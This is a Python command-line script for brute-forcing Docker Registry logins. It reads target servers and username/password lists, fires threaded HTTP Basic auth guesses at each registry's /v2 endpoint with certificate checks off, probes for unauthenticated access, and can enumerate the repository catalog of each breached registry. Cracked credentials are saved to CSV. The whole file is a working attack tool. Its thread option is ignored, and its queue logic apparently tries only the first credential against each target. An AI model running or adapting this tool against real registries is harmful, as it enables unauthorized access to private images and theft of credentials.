#! /usr/bin/env python3

import requests, warnings
from json import dump
from datetime import date
from base64 import b64encode
from argparse import ArgumentParser
from queue import Queue, Empty
from threading import Thread, Lock
from colorama import Fore, Back, Style
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

warnings.filterwarnings('ignore')
dump_details = False
lock = Lock()
thread_count = 100
successful_logins = {}


def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments():
    description = "Docker Registry Brute Force"
    parser = ArgumentParser(description=description)
    parser.add_argument('-t', "--target", type=str, required=True, help="Target Servers (Seperated by ',' or File Name)")
    parser.add_argument('-u', "--users", type=str, help="Target Users (seperated by ',') or File containing List of Users")
    parser.add_argument('-P', "--password", type=str, help="Passwords (seperated by ',') or File containing List of Passwords")
    parser.add_argument('-c', "--credentials", type=str, help="Name of File containing Credentials in format ({user}:{password})")
    parser.add_argument('-d', "--details", type=str, help="JSON File to store details about Docker Registry (Optional)")
    parser.add_argument('-W', "--threads", type=int, help=f"Threads to Spawn (Default={thread_count})", default=thread_count)
    parser.add_argument('-T', "--timeout", type=float, help="Timeout for Request", default=None)
    parser.add_argument('-w', "--write", type=str, help="CSV File to Dump Successful Logins (default=current date and time)", default=f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv")
    return parser.parse_args()

def login(target, username=None, password=None, timeout=None):
    t1 = time()
    try:
        headers = {}
        if username != None:
            basic_authorization = b64encode(f"{username}:{password}".encode()).decode()
            headers["Authorization"] = f"Basic {basic_authorization}"
        response = requests.get(f"{target}/v2", headers=headers, verify=False, timeout=timeout)
        authorization = True if response.status_code == 200 and response.json() == {} else False
        if dump_details:
            response = requests.get(f"{target}/v2/_catalog", headers=headers, verify=False, timeout=timeout)
            repositories = response.json()
            details = {"repositories": repositories}
        else:
            details = None
        t2 = time()
        return authorization, t2-t1, details
    except Exception as error:
        t2 = time()
        return (False, t2-t1, None) if "401" in str(error) and "Unauthorized" in str(error) else (error, t2-t1, None)
def loginHandler(thread_index, queue, credentials, timeout):
    for username, password in credentials:
        while True:
            try:
                target = queue.get_nowait()
            except Empty:
                break
            status, time_taken, details = login(target, username, password, timeout)
            if status == True:
                with lock:
                    successful_logins[target] = [username, password, details]
                    display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
            elif status == False:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
            else:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status}{Fore.RESET}{Back.RESET}")

if __name__ == "__main__":
    arguments = get_arguments()
    try:
        with open(arguments.target, 'r') as file:
            arguments.target = [target.strip() for target in file.read().split('\n') if target != '']
    except FileNotFoundError:
        arguments.target = arguments.target.split(',')
    except Exception as error:
        display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
        exit(0)
    if not arguments.credentials:
        if not arguments.users:
            arguments.users, arguments.password = [''], ['']
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
            exit(0)
        elif arguments.password != ['']:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    if arguments.details:
        dump_details = True
    total_servers = len(arguments.target)
    display('+', f"Total Target Servers = {Back.MAGENTA}{total_servers}{Back.RESET}")
    display('+', f"Total Credentials    = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    t1 = time()
    queue = Queue()
    for target in arguments.target:
        queue.put(target)
    threads = []
    for thread_index in range(thread_count):
        threads.append(Thread(target=loginHandler, args=(thread_index, queue, arguments.credentials, arguments.timeout, )))
        threads[-1].start()
    for thread in threads:
        thread.join()
    t2 = time()
    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)*total_servers/(t2-t1):.2f} logins / seconds{Back.RESET}")
    if len(successful_logins) > 0:
        display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
        with open(arguments.write, 'w') as file:
            file.write(f"Server,Username,Password\n")
            file.write('\n'.join([f"{server},{username},{password}" for server, (username, password, details) in successful_logins.items()]))
        if arguments.details:
            display(':', f"Dumping Details to File {Back.MAGENTA}{arguments.details}{Back.RESET}")
            with open(arguments.details, 'w') as file:
                dump({server: details for server, (username, password, details) in successful_logins.items()}, file)